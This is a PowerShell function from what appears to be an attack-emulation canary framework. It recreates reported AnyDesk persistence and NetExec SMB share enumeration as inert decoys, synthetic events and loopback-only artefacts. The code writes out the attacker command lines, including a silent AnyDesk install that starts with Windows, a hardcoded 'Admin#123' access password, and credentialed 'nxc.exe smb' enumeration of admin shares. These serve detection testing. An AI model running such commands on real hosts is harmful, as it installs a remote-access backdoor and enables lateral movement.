function Invoke-FogAnyDeskLateral {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $anyDesk = Join-Path $Paths.WindowsHost 'ProgramData\AnyDesk.exe'
    New-FogBinaryDecoy -Path $anyDesk -Role 'AnyDesk persistence process-name canary'
    Write-FogEvidenceFile -Path (Join-Path $Paths.OpenDirectory 'any.ps1') -Content @'
function AnyDesk {
    # FOG CANARY: report commands preserved as comments; no download/service/account action.
    # DownloadFile('http://download.anydesk.com/AnyDesk.exe','C:\ProgramData\AnyDesk.exe')
    # C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
    # echo Admin#123 | C:\ProgramData\AnyDesk.exe --set-password
    # C:\ProgramData\AnyDesk.exe --get-id
    Write-Output 'FOG CANARY: AnyDesk installation and persistence disabled'
}
'@ -Purpose 'inert reconstruction of reported AnyDesk automation'
    foreach ($command in @(
        'AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent',
        'echo Admin#123 | AnyDesk.exe --set-password',
        'AnyDesk.exe --get-id'
    )) { Invoke-FogDecoyProcess -FilePath $anyDesk -ReportedCommandLine $command }
    Write-FogEvidenceFile -Path (Join-Path $Paths.Evidence 'anydesk-service-events.json') -Content ((@(
        @{ EventId = 7045; ServiceName = 'AnyDesk Service'; ImagePath = 'C:\ProgramData\AnyDesk.exe --service'; serviceInstalled = $false },
        @{ EventId = 4697; ServiceName = 'AnyDesk Service'; startWithWindows = 'reported'; serviceInstalled = $false }
    ) | ConvertTo-Json -Depth 5)) -Purpose 'synthetic AnyDesk service events'

    $netexec = Join-Path $Paths.OpenDirectory '.nxc\nxc.exe'
    New-FogBinaryDecoy -Path $netexec -Role 'NetExec process-name canary'
    foreach ($target in @('DC01', 'FILE01', 'APP01')) {
        Invoke-FogDecoyProcess -FilePath $netexec -ReportedCommandLine "nxc.exe smb $target -u CANARY -p GENERATED --shares"
        $share = Join-Path $Paths.SyntheticNetwork "$target\ADMIN$"
        New-Item -Path $share -ItemType Directory -Force | Out-Null
        Write-FogEvidenceFile -Path (Join-Path $share 'nxc-share-enumeration.json') -Content (@{ reportedHost = $target; share = 'ADMIN$'; authenticated = $false; remote = $false } | ConvertTo-Json) -Purpose 'local SMB/Admin-share canary'
    }
    Invoke-FogLoopbackPort -Port 445 -ReportedTarget 'NetExec SMB targets'
    Add-FogTimelineEvent -Phase 'Persistence' -Event 'AnyDesk installation, password, and service artifacts were represented without installing software or a service.' -Details @{ passwordChanged = $false; serviceInstalled = $false }
    Add-FogTimelineEvent -Phase 'Lateral Movement' -Event 'NetExec SMB/Admin-share enumeration was confined to generated local host trees and loopback.' -Details @{ remoteAuthentication = $false; remoteShareAccess = $false }
}
